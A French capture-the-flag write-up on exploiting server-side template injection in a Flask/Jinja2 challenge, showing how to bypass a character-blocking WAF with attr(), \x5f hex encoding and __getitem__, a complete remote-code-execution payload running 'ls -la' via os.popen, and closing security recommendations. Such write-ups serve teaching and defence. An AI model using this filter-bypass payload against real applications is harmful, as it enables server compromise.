SSTI2
WAF Bypass via Jinja2

Exploitation d'une injection de template côté serveur avec contournement de filtre — encodage hexadécimal, filtre attr(), et chaîne d'attributs Flask.

Jinja2 / Flask RCE 200 pts · Moyen WAF Bypass
Phase 01

Qu'est-ce qu'une SSTI ?

Le Server-Side Template Injection est une vulnérabilité qui survient lorsqu'un attaquant injecte du code directement dans le moteur de templating côté serveur. Contrairement à une XSS (exécution côté client), ici le code s'exécute sur le serveur, avec toutes ses permissions système.

Les moteurs concernés — Jinja2, Twig, Freemarker, Pebble — permettent aux développeurs de générer du HTML dynamique en fusionnant données et templates. Si l'entrée utilisateur n'est pas isolée du template lui-même, tout ce que le moteur peut faire, l'attaquant peut le faire aussi.

ssti_diagram.png — Arbre SSTI
Arbre de détection des moteurs de templates via payloads progressifs

Dans ce challenge, l'application cible utilise Flask + Jinja2, le duo Python le plus répandu dans les CTF web. Jinja2 évalue les expressions entre {{ }} — c'est précisément ce vecteur que nous allons exploiter.

Phase 02

Analyse de l'application

En accédant à l'instance, on découvre un site de "prise de parole publique" : l'utilisateur saisit un message et le serveur l'affiche. Ce comportement de réaffichage est immédiatement suspect — l'entrée transite peut-être directement dans un template non assaini.

app_interface.png — Interface cible
L'entrée utilisateur est réaffichée telle quelle dans la page

2.1 — Détection : injection d'expression mathématique

La première sonde de tout pentest SSTI : injecter une expression que seul un moteur de template évaluera. Si le serveur affiche 49 au lieu de la chaîne littérale 7*7, la SSTI est confirmée.

Jinja2 — Payload de détection 
{{7*7}}

Pour distinguer Jinja2 des autres moteurs, on exploite un comportement propre à Python : multiplier une chaîne par un entier la répète. Ce comportement est spécifique à Jinja2/Python.

Rencontre avec le WAF

Après tests systématiques, on établit la liste des patterns interceptés par le WAF. Chaque élément bloqué correspond à une technique de contournement à développer.

Phase 04

Techniques de Contournement

4.1 — Bypass du point avec |attr()

Jinja2 expose un filtre natif attr() permettant d'accéder à un attribut par son nom sous forme de chaîne. On remplace chaque . par un appel |attr('nom').

Jinja2 — Test attr() 
{{ 'foo'|attr('upper') }}  {# équivalent à : 'foo'.upper() #}
attr_test.png
Résultat : FOO — upper() appelé via attr(), sans aucun point dans le payload
Résultat : FOO — Le point est entièrement contourné via |attr()

4.2 — Bypass des underscores avec l'encodage hexadécimal

Le WAF bloque le caractère _. En Python, les caractères peuvent être représentés par leur valeur hexadécimale dans une chaîne : _ vaut \x5f. Cette notation passe le filtre texte mais est interprétée correctement par Python.

Forme bloquée Forme encodée (bypass)
__\x5f\x5f
__class__\x5f\x5fclass\x5f\x5f
__globals__\x5f\x5fglobals\x5f\x5f
__builtins__\x5f\x5fbuiltins\x5f\x5f
__import__\x5f\x5fimport\x5f\x5f
__getitem__\x5f\x5fgetitem\x5f\x5f

4.3 — Bypass des crochets avec __getitem__

L'accès aux dictionnaires via ['clé'] est bloqué par le filtre sur les crochets. On utilise à la place la méthode magique Python __getitem__, appelable via attr().

Jinja2 — Substitution crochets → getitem 
# Bloqué :
dict['__builtins__']

# Bypass :
dict|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
getitem_test.png
__getitem__ via attr() — accès au dictionnaire sans crochets

4.4 — Point d'entrée : l'objet request de Flask

L'objet request de Flask est injecté automatiquement dans tous les contextes de template. Il donne accès à request.application, qui est l'objet application Flask lui-même — et donc à ses __globals__ Python.

request → .application → .__globals__ → __builtins__ → __import__ → os → .popen()

Exploitation — Payload Final

5.1 — Listing du répertoire (ls -la)

On assemble toutes les techniques de bypass en un seul payload : attr() remplace les points, \x5f remplace les underscores, et __getitem__ remplace les crochets.

Jinja2 — Payload RCE · ls -la 
{{request
  |attr('application')
  |attr('\x5f\x5fglobals\x5f\x5f')
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
  |attr('popen')('ls -la')
  |attr('read')()}}
Segment du payload Équivalent Python Rôle
request request Objet requête Flask — disponible dans tout template
|attr('application') .application Accède à l'objet application Flask
|attr('\x5f\x5fglobals\x5f\x5f') .__globals__ Dictionnaire des variables globales du module
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f') ['__builtins__'] Accède aux builtins Python
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os') __import__('os') Importe le module système os
|attr('popen')('ls -la') .popen('ls -la') Exécute la commande shell
|attr('read')() .read() Lit et retourne la sortie standard

Phase 07

Recommandations de Sécurité

Ce challenge illustre pourquoi la sécurité des applications Flask doit être pensée en profondeur, et non résumée à une liste noire de caractères. Voici les mesures correctives essentielles.

  • 01
    Ne jamais injecter l'entrée utilisateur dans le template lui-même. Passer les données comme variables au template via render_template('page.html', user_input=value), jamais via render_template_string(user_input).
  • 02
    Activer le sandboxing Jinja2. La classe SandboxedEnvironment de Jinja2 restreint l'accès aux attributs dangereux comme __globals__ et __builtins__.
  • 03
    Ne pas se fier à une blacklist de caractères. Ce challenge le démontre : bloquer _ ne suffit pas si l'encodage hexadécimal \x5f n'est pas également filtré — et ainsi de suite récursivement.
  • 04
    Appliquer le principe du moindre privilège. L'application web ne devrait pas tourner avec les permissions d'un compte capable de lire des fichiers système sensibles. Isoler le processus dans un conteneur ou via seccomp.
  • 05
    Déployer un WAF avec détection comportementale. Une détection basée sur les patterns SSTI connus (arbres d'expression, chaînes d'attributs) est plus robuste qu'un simple filtrage de caractères individuels.
